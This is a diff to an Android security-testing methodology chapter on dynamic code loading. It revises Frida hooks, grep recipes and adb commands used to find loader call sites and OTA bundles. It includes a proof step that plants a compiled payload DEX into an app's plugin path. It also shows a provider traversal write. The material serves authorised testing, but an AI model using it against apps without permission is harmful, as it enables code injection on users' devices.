@@ -35,7 +35,7 @@ maps the app's *write* primitives onto the loader's *read* path. D07 and D08 tes
 traversal and file it as "arbitrary file write, High". D17 testers take the same primitive, land it in
 `lib-main/`, `verified-splits/config.x.apk`, `files/plugin.dex` or a `.so` the app `System.load()`s, and
 file P1. The write and the load are separate fixes — file them as separate reports and let the chain be the
-severity amplifier (see D17-075).
+severity amplifier (see D17-079).
 
 Be honest about the rest of it. Most of this domain is graveyard, and the graveyard is enormous. "App
 bundles okhttp 4.9.0, CVE-2021-0341" with no pinning and system trust is **Low**, and with no reachability
@@ -55,7 +55,7 @@ call that runs them?**
 
 ## Applicability probe
 
-D17 never goes fully n/a — D17-001, D17-002, D17-005, D17-017, D17-078, D17-079 and D17-080 always run — but four probes decide which of its six blocks apply and let `scripts/scope.py` mark the rest. Run them against `$DEC`, the apktool manifest and `inventory/components.csv`, and paste the four numbers into `notes`.
+D17 never goes fully n/a — D17-001, D17-002, D17-005, D17-017, D17-078, D17-079 and D17-080 always run — but four probes decide which of its six blocks apply and let `scripts/scope.py` (planned; until it ships, `mark.py Dnn-NNN n/a`) mark the rest. Run them against `$DEC`, the apktool manifest and `inventory/components.csv`, and paste the four numbers into `notes`.
 
 ```bash
 # 1. Code-load call sites outside framework namespaces (blocks D17-003..023, D17-083)
@@ -84,16 +84,17 @@ Decision table (write the matching note into `notes` for every row the probe ret
 | 2: manifest=0, strings=0, playcore=0 and the proxy shows no bundle/archive/executable response | D17-025..D17-036, D17-041, D17-081 | `n/a: no OTA, split, remote-config or dynamic-module channel (probe 2 = 0/0/0); D17-025 negative recorded` |
 | 3: first-party sink count = 0 **or** exported component count = 0 | D17-043..D17-051, D17-056..D17-058 | `n/a: no deserialization/archive sink in first-party code (probe 3 = 0) / no exported component (components.csv = 0)` |
 | 4: `.so` count = 0 | D17-013, D17-014, D17-062, D17-082 | `n/a: APK ships no native libraries (probe 4 = 0)` |
-| 4: `META-INF/*.version` = 0 and no source repo in scope | D17-059 (source half), D17-063..D17-069, D17-072..D17-074 | `n/a (black-box): build system not Gradle or no source access; binary-side SBOM (D17-059) and duplicate-class check (D17-069b) recorded instead` |
+| 4: `META-INF/*.version` = 0 and no source repo in scope | D17-059 (source half), D17-063..D17-069, D17-072..D17-074 | `n/a (black-box): build system not Gradle or no source access; binary-side SBOM (D17-059) and the binary-side duplicate-class check of D17-069 recorded instead` |
 | framework ≠ react-native / cordova / capacitor / flutter | D17-006, D17-026..D17-030, D17-033, D17-034, D17-072, D17-073, D17-074 | `n/a: framework=<value>; no JS/Dart bundle to substitute` |
 
-A probe count of 0 is a negative only with its control: for probe 1 the D17-002 runtime trace must have run to completion (`-t` honoured, no crash — D17-A01), and for probe 3 the `components.csv` must have been regenerated after P3 (gap 55: the generator can drop providers).
+A probe count of 0 is a negative only with its control: for probe 1 the D17-002 runtime trace must have run to completion (`-t` honoured, no crash: the linker-level `do_dlopen` hook, never a libdl `dlopen` Interceptor), and for probe 3 the `components.csv` must have been regenerated after P3 (the inventory generator has been observed to drop providers — re-run `scripts/inventory.py` and compare the provider count against the manifest).
 
 ## Triage order
 
 1. **Hook every loader at runtime for one full app walkthrough** (`DexClassLoader.$init`,
    `InMemoryDexClassLoader.$init`, `System.load`, `System.loadLibrary`, `Runtime.load`,
-   `ClassLoader.loadClass`, and for RN `CatalystInstanceImpl.loadScriptFromFile`). Twenty minutes, and it
+   `ClassLoader.loadClass`, and for RN the bundle loader — `JSBundleLoader.create*Loader` on both architectures,
+   `CatalystInstanceImpl.loadScriptFromFile` on the legacy bridge only; D17-006). Twenty minutes, and it
    answers the crux question empirically instead of by grep — including for packed apps where the static
    view is a stub.
 2. **Establish which artefact is actually executing.** If OTA is live, the APK's bundle is only the
@@ -113,6 +114,18 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 8. **Dependency graph and SBOM last**, and only with a reachability trace attached. This step produces the
    most output and the fewest payable findings; do it when the high-yield work is done.
 
+**Harness notes for every runtime item in this chapter.** *Frida:* always `frida -D "$SERIAL"` (`-U` picks a
+device silently when several are attached) in spawn mode (`-f`) with `-t <seconds>` long enough for the
+walkthrough — without `-t` the session detaches right after script load and every hook shows zero hits.
+the old no-pause flag no longer exists (frida-tools 17 resumes by default). Attach mode (`-p`) does not honour `-t` on
+frida-tools 17.x and can hold the device lock until killed: wrap it in an external `timeout`/`gtimeout` and
+prefer spawn mode. A script whose "hooks installed" line is missing produced no negative. *Observation channel:*
+`run-as` works only on `android:debuggable="true"` builds and prints `package not debuggable` on a release APK
+— that error is not "directory empty". On a release build observe from the rooted AVD with
+`adb -s "$SERIAL" shell "su 0 sh -c '<cmd>'"` and **only observe** through it: every write that is part of a
+proof comes from the attacker-model path (zero-permission app, provider traversal, zip slip — D17-009), never
+from `run-as` or `su` (that is AM-12). Where an item below says `run-as`, read `su 0 sh -c` on the AVD.
+
 ## Items
 
 ### D17-001 · Inventory every code-load call site in the shipped artefact
@@ -123,27 +136,30 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | n/a — inventory step that feeds `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | n/a (tester step) |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASWE-0049; MASTG-TECH-0029; `developer.android.com/privacy-and-security/risks/dynamic-code-loading` (MASVS-CODE) |
 
 - **Test:** Enumerate every API that can turn bytes into executable code in this process, then trace each
   one's path argument back to its origin. Everything else in this chapter is a consequence of this table.
 - **How:**
   ```bash
-  jadx -d out target.apk
-  # Java/Kotlin loaders
-  grep -rnE 'DexClassLoader|PathClassLoader|InMemoryDexClassLoader|BaseDexClassLoader|DelegateLastClassLoader|DexFile|openDexFile|URLClassLoader|optimizedDirectory' out/sources/ \
-    | grep -viE '^out/sources/(android|androidx|dalvik|kotlin)/'
+  # Java/Kotlin loaders ($DEC is the P2 decompilation — never re-run jadx per item)
+  grep -rnE 'DexClassLoader|PathClassLoader|InMemoryDexClassLoader|BaseDexClassLoader|DelegateLastClassLoader|DexFile|openDexFile|URLClassLoader|optimizedDirectory' $DEC/jadx/sources/ \
+    | grep -viE '/(android|androidx|dalvik|kotlin|kotlinx)/'
   # native loaders
-  grep -rnE 'System\.load\(|System\.loadLibrary\(|Runtime\.getRuntime\(\)\.load' out/sources/ \
-    | grep -viE '^out/sources/(android|androidx)/'
-  # cross-package code
-  grep -rnE 'createPackageContext|CONTEXT_INCLUDE_CODE|CONTEXT_IGNORE_SECURITY|getClassLoader\(\)' out/sources/
+  grep -rnE 'System\.load\(|System\.loadLibrary\(|Runtime\.getRuntime\(\)\.load' $DEC/jadx/sources/ \
+    | grep -viE '/(android|androidx|kotlin|kotlinx)/'
+  # cross-package code. The platform-services DynamiteModule loader and createPackageContext("<platform-services
+  # package>", 3) are that SDK's own signature-gated loaders: triage them once under D17-021, not per hit
+  grep -rnE 'createPackageContext|CONTEXT_INCLUDE_CODE|CONTEXT_IGNORE_SECURITY|getClassLoader\(\)' $DEC/jadx/sources/ | grep -vE '/com/google/android/gms/'
   # split / feature modules
-  grep -rnE 'SplitCompat|SplitInstallManager|SplitCompatApplication|com\.google\.android\.play\.core' out/sources/
+  grep -rnE 'SplitCompat|SplitInstallManager|SplitCompatApplication|com\.google\.android\.play\.core' $DEC/jadx/sources/
   # reflection dispatchers
-  grep -rncE 'Class\.forName\(|getDeclaredMethod\(|getMethod\(|\.invoke\(' out/sources/ | sort -t: -k2 -rn | head -20
+  grep -rncE 'Class\.forName\(|getDeclaredMethod\(|getMethod\(|\.invoke\(' $DEC/jadx/sources/ | sort -t: -k2 -rn | head -20
+  # embedded interpreters (code that never touches a ClassLoader) — feeds D17-085
+  grep -rnE 'org/mozilla/javascript|com/eclipsesource/v8|QuickJS|org/luaj|com/chaquo/python|duktape|evaluateString\(|executeScript\(|LuaValue' $DEC/jadx/sources/ | grep -vE '/(android|androidx|kotlin|kotlinx|dalvik)/'
   # what directories does the app hand to a loader?
-  grep -rnE 'getDir\("|getFilesDir\(\)|getCodeCacheDir\(\)|getCacheDir\(\)|getExternalFilesDir|getExternalCacheDir|nativeLibraryDir' out/sources/
+  grep -rnE 'getDir\("|getFilesDir\(\)|getCodeCacheDir\(\)|getCacheDir\(\)|getExternalFilesDir|getExternalCacheDir|nativeLibraryDir' $DEC/jadx/sources/
   ```
   Build one table: `call site | artefact path | who can write that path | is there a signature/hash check
   between the read and the load`.
@@ -164,6 +180,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | n/a |
 | **Attacker** | n/a (tester step) |
 | **Applies to** | all; mandatory for packed, obfuscated or cross-platform apps |
+| **Requires** | device, frida |
 | **Maps to** | MASTG-TECH-0042 (Getting Loaded Classes and Methods Dynamically); MASTG-TECH-0041 (Library Injection); Frida `DexClassLoader`/`InMemoryDexClassLoader` hooks |
 
 - **Test:** Grep sees only what R8 left behind and nothing a packer decrypts. Hook the loaders and drive the
@@ -171,7 +188,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   an update.
 - **How:**
   ```javascript
-  // loaders.js  —  frida -D "$SERIAL" -f com.target.app -l loaders.js
+  // loaders.js  —  frida -D "$SERIAL" -f com.target.app -l loaders.js -t 120   (spawn mode; -t keeps the session alive — see the harness notes under Triage order)
   Java.perform(function () {
     var DCL = Java.use('dalvik.system.DexClassLoader');
     DCL.$init.implementation = function (dex, opt, lib, parent) {
@@ -204,12 +221,29 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   });
   ```
   ```bash
-  # native side, catches dlopen the Java hooks miss
-  frida-trace -U -f com.target.app -i "dlopen*" -i "android_dlopen_ext"
-  # and the ground truth after the fact
+  # native side, catches dlopen the Java hooks miss. Hook the LINKER's internal entry, never libdl's exported
+  # dlopen/android_dlopen_ext: a Frida Interceptor there changes the caller address the linker uses for namespace
+  # selection and the app crashes in GL/EGL init (seen on a real engagement — the crash reads like tamper detection).
+  cat > codeload-trace.js <<'JS'
+  // codeload-trace.js — linker-level dlopen trace, 64-bit with 32-bit fallback
+  var m = Process.findModuleByName('linker64') || Process.findModuleByName('linker');
+  var p = null;
+  if (m) {
+    m.enumerateSymbols().forEach(function (s) { if (!p && s.name.indexOf('do_dlopen') !== -1) p = s.address; });
+    if (!p) p = m.findExportByName('__dl__Z9do_dlopenPKciPK17android_dlextinfoPKv');
+  }
+  if (!p) { console.log('[do_dlopen] symbol not found on this build — use the /proc/<pid>/maps before/after diff instead'); }
+  else Interceptor.attach(p, { onEnter: function (a) { console.log('[do_dlopen] ' + a[0].readUtf8String()); } });
+  console.log('[codeload-trace] hook ' + (p ? 'installed at ' + p : 'NOT installed'));
+  JS
+  frida -D "$SERIAL" -f com.target.app -t 90 -l codeload-trace.js
+  # and the ground truth after the fact (observation only — run-as needs a debuggable build; on a release APK read
+  # through su on the rooted AVD, never write through it: Triage order, "Observation channel")
   adb shell run-as com.target.app sh -c 'find files cache code_cache no_backup app_* -maxdepth 5 \
     \( -name "*.dex" -o -name "*.jar" -o -name "*.apk" -o -name "*.so" -o -name "*.bundle" -o -name "*.hbc" \) -ls 2>/dev/null'
-  adb shell "cat /proc/$(adb shell pidof com.target.app)/maps" | grep -E '\.(so|dex|jar|apk|oat|vdex)$' | grep -v '/data/app/'
+  # every process of the app (android:process / :isolated children), substituted by the DEVICE shell — a host-side
+  # $(adb shell pidof …) breaks on several PIDs or a trailing CR. Reading another UID's maps needs root: rooted AVD.
+  adb shell 'for p in $(pidof com.target.app); do echo "== $p"; cat /proc/$p/maps; done' | grep -E '^== |\.(so|dex|jar|apk|oat|vdex)$' | grep -v '/data/app/'
   ```
 - **Proof:** A logged load whose path is **not** under `/data/app/` — e.g.
   `[DexClassLoader] dex=/data/user/0/com.target.app/files/plugin.dex`, or a `/proc/<pid>/maps` line for a
@@ -217,7 +251,9 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 - **Escalation:** Each non-APK path becomes a row in the D17-001 table and a candidate for D17-008.
 - **Ruled out when:** Across a complete feature walkthrough including an update check, every load resolves
   under `/data/app/~~<random>/com.target.app-<random>/` or `/apex/`, and `/proc/<pid>/maps` shows no mapped
-  `.so` outside the APK and the system paths.
+  `.so` outside the APK and the system paths. Where the linker symbol is unavailable, a before/after diff of
+  `/proc/<pid>/maps` across the walkthrough is the non-invasive fallback — say which of the two you used, and
+  note that a trace that crashed or detached before the walkthrough ended is not a negative.
 
 ### D17-003 · Enumerate class loaders — the classes `Java.use` cannot see
 
@@ -227,6 +263,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | n/a |
 | **Attacker** | n/a (tester step) |
 | **Applies to** | apps using `DexClassLoader`, `InMemoryDexClassLoader`, Play Feature Delivery, or any OTA/plugin framework |
+| **Requires** | device, frida |
 | **Maps to** | Frida `Java.enumerateClassLoaders`, `Java.ClassFactory.get(classLoader)`, `Java.classFactory`, `Java.openClassFile(filePath)`; objection `android hooking list class_loaders`; MASTG-TECH-0042 |
 
 - **Test:** Code loaded from a secondary DEX, a downloaded plugin or a dynamic feature module lives in a
@@ -256,7 +293,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 - **Proof:** A `DexClassLoader`/`InMemoryDexClassLoader`/`PathClassLoader` entry whose `toString()` names a
   path outside the base APK, plus a successful hook on a class reachable only through it.
 - **Escalation:** Identifies the artefact to substitute in D17-008; identifies the verification routine to
-  neutralise in D17-034.
+  neutralise in D17-032.
 - **Ruled out when:** `Java.enumerateClassLoaders` returns only the boot classloader and a single
   `PathClassLoader` over `/data/app/…/base.apk` (plus split APKs from the same install session) at every
   point in the app's lifecycle you sampled.
@@ -295,7 +332,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 - **Proof:** The hook firing with a non-trivial capacity, plus a decompiled upstream routine whose input is
   a tamperable archive, a network-sourced blob, or an attacker-controlled metadata field. Dump the recovered
   DEX from the buffer for static analysis.
-- **Escalation:** → D17-033 (forge the update metadata), D17-056 (zip slip into the staging archive), D12
+- **Escalation:** → D17-031 (forge the update metadata), D17-056 (zip slip into the staging archive), D12
   if the decryption key is hardcoded.
 - **Ruled out when:** The hook never fires across a full walkthrough including a forced update check; or it
   fires only for a buffer built from bytes read out of the signed APK's own `assets/` with no network or IPC
@@ -309,17 +346,20 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | n/a — obfuscation alone is informational and must never be filed |
 | **Attacker** | n/a (tester step) |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASTG-TOOL-0009 (APKiD); MASTG-TOOL-0022 (ProGuard — note it strips the version info this chapter needs) |
 
-- **Test:** If `jadx` output is empty, trivial, or an obvious stub, the real DEX is decrypted at runtime and
+- **Test:** Cross-reference: D01-023 / D26-023 run APKiD in P2 — cite that verdict here; this item keeps only
+  the static-vs-runtime class-count check that decides whether the static view is a stub. If `jadx` output is empty, trivial, or an obvious stub, the real DEX is decrypted at runtime and
   every grep in this chapter returns nothing for the wrong reason. Detect it explicitly rather than
   reporting a clean result.
 - **How:**
   ```bash
   apkid target.apk
-  jadx -d out target.apk 2>&1 | tail -5
+  # jadx's own error summary from the P2 decompilation (a packer floods it with ERROR / DecodeException) — keep that
+  # log; re-decompile only if it was not kept:  jadx -d "$DEC/jadx" "$E/apk/base.apk" 2>&1 | tail -5
   # class-count sanity check: static vs runtime
-  grep -rc 'class ' out/sources/ | wc -l
+  grep -rc 'class ' $DEC/jadx/sources/ | wc -l
   ```
   ```javascript
   // runtime class count — if it dwarfs the static one, the app unpacks itself
@@ -343,10 +383,12 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) as the reportable half; the methodological half is not a finding |
 | **Attacker** | n/a for the method; AM-09 for the consequence |
 | **Applies to** | React Native / Expo / CodePush / Cordova / any app with a custom DEX or JS updater |
-| **Requires** | device, frida, react-native, cordova, capacitor, flutter |
+| **Requires** | device, frida |
 | **Maps to** | facebook/hermes `BytecodeFileHeader.sourceHash`; `CodePushConstants.DEFAULT_JS_BUNDLE_NAME`; expo `dev.expo.updates.prefs` / `updates.db`; MASWE-0075 (Non-Reproducible Builds) |
 
-- **Test:** If OTA is enabled, the bundle inside the APK is only the *fallback*. Every static finding, and
+- **Test:** Cross-reference: D19-003 is the canonical artefact-identity item (D01-032 is its P2 pointer) — run
+  it once, cite the verdict here, and use this item for the Hermes `sourceHash` comparison and the bundle-loader
+  hook below. If OTA is enabled, the bundle inside the APK is only the *fallback*. Every static finding, and
   every "we fixed that" claim from the client, must be re-verified against the bundle currently in use. This
   also means a security control the client believes is shipped can be silently removed post-review by a
   channel push, with no `versionCode` change.
@@ -367,13 +409,38 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   d = open('live.bundle','rb').read(64)
   print('live sourceHash', d[12:32].hex(), 'bytecodeVersion', struct.unpack_from('<I', d, 8)[0])
   PY
-  # 3. or capture it at load time regardless of location
-  frida -D "$SERIAL" -f com.target.app -q -e "
-  Java.perform(function(){
-    var C = Java.use('com.facebook.react.bridge.CatalystInstanceImpl');
-    C.loadScriptFromFile.implementation=function(f,u,z){console.log('[bundle-from-file] '+f);return this.loadScriptFromFile(f,u,z);};
-    C.loadScriptFromAssets.implementation=function(a,u,z){console.log('[bundle-from-assets] '+u);return this.loadScriptFromAssets(a,u,z);};
-  });"
+  # 3. or capture it at load time regardless of location — hook the bundle loader, which exists on BOTH architectures;
+  #    CatalystInstanceImpl is not instantiated under bridgeless mode (New Architecture, the default since RN 0.76)
+  cat > bundle-source.js <<'JS'
+  Java.perform(function () {
+    var hooked = 0, args = function (a) { return Array.prototype.slice.call(a).map(String).join(' | '); };
+    try {
+      var L = Java.use('com.facebook.react.bridge.JSBundleLoader');
+      ['createFileLoader', 'createAssetLoader', 'createCachedBundleFromNetworkLoader'].forEach(function (n) {
+        if (!L[n]) return;
+        L[n].overloads.forEach(function (o) {
+          o.implementation = function () { console.log('[JSBundleLoader.' + n + '] ' + args(arguments)); return o.apply(this, arguments); };
+        });
+        hooked++;
+      });
+    } catch (e) { console.log('[bundle-source] JSBundleLoader not found: ' + e); }
+    try {   // legacy bridge only
+      var C = Java.use('com.facebook.react.bridge.CatalystInstanceImpl');
+      C.loadScriptFromFile.implementation = function (f, u, z) { console.log('[bundle-from-file] ' + f); return this.loadScriptFromFile(f, u, z); };
+      C.loadScriptFromAssets.implementation = function (a, u, z) { console.log('[bundle-from-assets] ' + u); return this.loadScriptFromAssets(a, u, z); };
+      hooked++;
+    } catch (e) {}
+    try {   // bridgeless (RN >= 0.76 default)
+      var RI = Java.use('com.facebook.react.runtime.ReactInstance');
+      RI.loadJSBundle.overloads.forEach(function (o) {
+        o.implementation = function () { console.log('[ReactInstance.loadJSBundle] ' + args(arguments)); return o.apply(this, arguments); };
+      });
+      hooked++;
+    } catch (e) {}
+    console.log('[bundle-source] hooks installed: ' + hooked + '   (0 = nothing resolved: R8-renamed or not React Native — an empty log is NOT a negative)');
+  });
+  JS
+  frida -D "$SERIAL" -f com.target.app -t 60 -l bundle-source.js
   # 4. expo-side artefacts
   adb shell "run-as com.target.app ls -la files/.expo-internal/ shared_prefs/dev.expo.updates.prefs.xml" 2>/dev/null
   ```
@@ -385,7 +452,8 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 - **Escalation:** Re-base the whole engagement on the on-device bundle and say so in the report's scope
   section. → D17-028/029 for the signature question; → D19 for bundle analysis.
 - **Ruled out when:** The manifest carries no `expo.modules.updates.*` meta-data, `strings.xml` carries no
-  `CodePush*` resource, the `CatalystInstanceImpl` hook fires only `loadScriptFromAssets`, and the on-device
+  `CodePush*` resource, the bundle-loader hook (`bundle-source.js`, with at least one hook installed) reports only
+  an asset loader (`createAssetLoader` / `loadScriptFromAssets`), and the on-device
   `files/` contains no bundle. Record the APK's own `sourceHash` as the tested artefact either way.
 
 ### D17-007 · The app ships an ingress capability — it downloads and stores executables
@@ -396,23 +464,24 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `insecure_data_transport.executable_download.no_secure_integrity_check` (P4) → override with the execution proof |
 | **Attacker** | AM-06 / AM-09 |
 | **Applies to** | all |
+| **Requires** | device |
 | **Maps to** | ATT&CK T1544 (Ingress Tool Transfer — detection framing: "correlating outbound retrieval to non-baselined sources with immediate local executable creation"); T1407 |
 
 - **Test:** Does the app download binaries, scripts or archives to the device? Each download is
   simultaneously a substitution candidate and a dropper wearing the client's brand.
 - **How:**
   ```bash
-  grep -rnE 'DownloadManager|\.byteStream\(|FileOutputStream|ZipInputStream|setExecutable|chmod|"\.apk"|"\.so"|"\.dex"|"\.jar"' -B4 -A4 out/sources/ \
-    | grep -viE '^out/sources/(android|androidx)/'
+  grep -rnE 'DownloadManager|\.byteStream\(|FileOutputStream|ZipInputStream|setExecutable|chmod|"\.apk"|"\.so"|"\.dex"|"\.jar"' -B4 -A4 $DEC/jadx/sources/ \
+    | grep -viE '/(android|androidx|kotlin|kotlinx)/'
   # what actually lands, and when
-  adb shell "run-as com.target.app find . -type f \( -name '*.so' -o -name '*.dex' -o -name '*.jar' -o -name '*.apk' -o -name '*.zip' \) -newermt '-1 hour' -ls"
+  adb shell "run-as com.target.app find . -type f \( -name '*.so' -o -name '*.dex' -o -name '*.jar' -o -name '*.apk' -o -name '*.zip' \) -mmin -60 -ls"   # toybox find has -mmin, not -newermt
   adb shell dumpsys package com.target.app | grep -i 'REQUEST_INSTALL_PACKAGES'
   ```
 - **Proof:** A file in the app's data dir after a feature is used that was not in the APK — list it with its
   timestamp and SHA-256, and show the source URL in the proxy log.
 - **Escalation:** `setExecutable(true)` on a downloaded file plus any exec primitive is RCE.
   `REQUEST_INSTALL_PACKAGES` plus an unsigned download is a second-stage APK install (state the privilege
-  precisely — see D17-037).
+  precisely — see D17-035).
 - **Ruled out when:** No file appears in the app's data directory that is not derived from the APK or from
   user-supplied content, across a complete feature walkthrough with the proxy recording every response
   `Content-Type`.
@@ -425,6 +494,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1); the Android-native analogue `client_side_injection.binary_planting.privilege_escalation` (P3, CWE-929) understates it — cite it for accuracy and request P1 with the execution proof |
 | **Attacker** | AM-03 (local app writing the path) / AM-09 (the path was populated from the network) |
 | **Applies to** | all. `optimizedDirectory` is deprecated from **API 26** but an old call site pointing it at a shared directory is still live on lower `minSdk` |
+| **Requires** | device |
 | **Maps to** | MASWE-0049 (CWE-494); `risks/dynamic-code-loading` (MASVS-CODE); `about/versions/14/behavior-changes-14`; H1 #1161956 (porcupiney.hairs, "Insecure Loading of a Dex File"); H1 #1115864 (persistent arbitrary code execution in Mattermost Android) |
 
 - **Test:** A `ClassLoader` constructed over a file the app (or anyone else) can rewrite, with no
@@ -432,9 +502,9 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   rule is absolute: *"Don't load code from external sources (network, external storage)."*
 - **How:**
   ```bash
-  grep -rnE 'DexClassLoader|PathClassLoader|InMemoryDexClassLoader|BaseDexClassLoader|DelegateLastClassLoader' -B8 -A8 out/sources/ \
+  grep -rnE 'DexClassLoader|PathClassLoader|InMemoryDexClassLoader|BaseDexClassLoader|DelegateLastClassLoader' -B8 -A8 $DEC/jadx/sources/ \
     | grep -nE 'getExternalFilesDir|getExternalCacheDir|getCacheDir|getFilesDir|getDir\(|download|http|optimizedDirectory'
-  grep -rn 'setReadOnly()' out/sources/          # its ABSENCE next to a loader is the tell
+  grep -rn 'setReadOnly()' $DEC/jadx/sources/          # its ABSENCE next to a loader is the tell
   adb shell run-as com.target.app ls -l files/ cache/ code_cache/ app_dex/ no_backup/ 2>/dev/null
   adb shell ls -la /sdcard/Android/data/com.target.app/files/ 2>/dev/null
   ```
@@ -450,7 +520,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   javac -source 8 -target 8 -cp "$ANDROID_HOME/platforms/android-34/android.jar" Payload.java -d cls
   d8 --output . cls/com/pwn/Payload.class
   adb push classes.dex /sdcard/
-  adb shell "run-as com.target.app cp /sdcard/classes.dex files/plugin.dex"
+  adb shell "run-as com.target.app cp /sdcard/classes.dex files/plugin.dex"   # load-site confirmation ONLY (needs a debuggable build); the finding's write comes from D17-009's attacker-model primitive, never from run-as/su
   adb shell am force-stop com.target.app && adb shell monkey -p com.target.app 1
   adb logcat --pid=$(adb shell pidof com.target.app) | grep PWNMARK7f3a91
   ```
@@ -470,6 +540,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-03 |
 | **Applies to** | all — run this whenever *any* domain produces a write, create, copy, rename or extract primitive |
+| **Requires** | device |
 | **Maps to** | Oversecured *"Why dynamic code loading could be dangerous for your apps: a Google example"*; Intigriti Bug Bytes #128 and #87; Microsoft *Dirty Stream* (Xiaomi File Manager V1-210567 → V1-210593; WPS Office 16.8.1 → 17.0.0) |
 
 - **Test:** A write is not execution. The moment you obtain any write primitive, the next question is not
@@ -479,7 +550,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 - **How:** Build the join explicitly:
   ```bash
   # LOAD side (from D17-001/002)
-  grep -rnE 'DexClassLoader|PathClassLoader|System\.load\(|SplitCompat|splitcompat' out/sources/ > /tmp/load_sites.txt
+  grep -rnE 'DexClassLoader|PathClassLoader|System\.load\(|SplitCompat|splitcompat' $DEC/jadx/sources/ > /tmp/load_sites.txt
   # WRITE side (from D07 traversal, D08 redirection, D11 external storage, D17-056 zip slip)
   #   e.g. a provider whose openFile() resolves a caller-supplied name:
   adb shell content write --uri \
@@ -512,6 +583,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) with the race won; otherwise `client_side_injection.binary_planting.privilege_escalation` (P3) |
 | **Attacker** | AM-03 |
 | **Applies to** | Platform **enforcement at targetSdk ≥ 34**; the underlying race exists at every API level |
+| **Requires** | device |
 | **Maps to** | `about/versions/14/behavior-changes-14` — "Safer Dynamic Code Loading (DCL): all dynamically-loaded files must be marked as read-only … Set files read-only **before** writing content to prevent race conditions"; "For Existing Files: Delete and recreate, or verify integrity before relabeling as read-only"; AOSP Android 14 "Dynamic Code Loading restrictions" |
 
 - **Test:** The documented pattern is `setReadOnly()` **then** write. An app that writes first and marks
@@ -520,7 +592,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   comply sometimes moved the payload out of the checked path instead (native `dlopen`, or write-then-copy).
 - **How:**
   ```bash
-  grep -rnE 'DexClassLoader|PathClassLoader|InMemoryDexClassLoader|BaseDexClassLoader' -B6 -A10 out/sources/ \
+  grep -rnE 'DexClassLoader|PathClassLoader|InMemoryDexClassLoader|BaseDexClassLoader' -B6 -A10 $DEC/jadx/sources/ \
     | grep -nE 'setReadOnly|FileOutputStream|\.write\(|Files\.copy'
   adb shell run-as com.target.app ls -l files/*.jar files/*.dex app_dex/ code_cache/ 2>/dev/null
   adb logcat -d | grep -iE 'dex file .* is not read-only|Writable dex file|not read-only'
@@ -558,8 +630,8 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   can tamper with it between download and load — no network position required.
 - **How:**
   ```bash
-  grep -n 'requestLegacyExternalStorage\|MANAGE_EXTERNAL_STORAGE' out/AndroidManifest.xml
-  grep -rnE 'getExternalFilesDir|getExternalCacheDir|Environment\.getExternalStorage' out/sources/ -A6 \
+  grep -n 'requestLegacyExternalStorage\|MANAGE_EXTERNAL_STORAGE' $DEC/apktool/AndroidManifest.xml
+  grep -rnE 'getExternalFilesDir|getExternalCacheDir|Environment\.getExternalStorage' $DEC/jadx/sources/ -A6 \
     | grep -iE 'dex|jar|apk|so|zip|bundle|plugin|update'
   adb shell ls -lR /sdcard/Android/data/com.target.app/ | grep -Ei '\.(so|dex|jar|apk|zip|bundle)$'
   ```
@@ -573,7 +645,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 - **Escalation:** → D17-008. This variant is the highest-confidence one to report because the attacker
   precondition is a permission millions of apps already hold.
 - **Ruled out when:** No executable artefact ever appears under external storage (verified with a
-  `find /sdcard -newermt` sweep after a full walkthrough), **and** the manifest does not set
+  `find /sdcard -mmin -N` sweep after a full walkthrough), **and** the manifest does not set
   `requestLegacyExternalStorage`.
 
 ### D17-012 · SplitCompat / `verified-splits` as the write target
@@ -584,6 +656,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
 | **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
 | **Attacker** | AM-03 |
 | **Applies to** | apps using Play Feature Delivery / `SplitCompat` / dynamic feature modules |
+| **Requires** | device |
 | **Maps to** | Oversecured *"Why dynamic code loading could be dangerous for your apps: a Google example"* — "when a file in that folder starts with a `config.` prefix, it will be added to the app's runtime ClassLoader automatically"; path traversal `..%2Fsplitcompat%2F`; persistence "even after attacker app removal" |
 
 - **Test:** Play Core's split-loading machinery adds any `config.`-prefixed file in the `verified-splits`
@@ -591,7 +664,7 @@ A probe count of 0 is a negative only with its control: for probe 1 the D17-002 
   whether *any* write primitive you hold reaches that directory.
 - **How:**
   ```bash
-  grep -rnE 'SplitCompat\.install|SplitInstallManager|SplitCompatApplication|setAllowedSplitTypes|local_testing' out/sources/
+  grep -rnE 'SplitCompat\.install|SplitInstallManager|SplitCompatApplication|setAllowedSplitTypes|local_testing' $DEC/jadx/sources/
   adb shell run-as com.target.app sh -c 'find files -maxdepth 5 -path "*splitcompat*" -o -path "*local_testing*" -print'
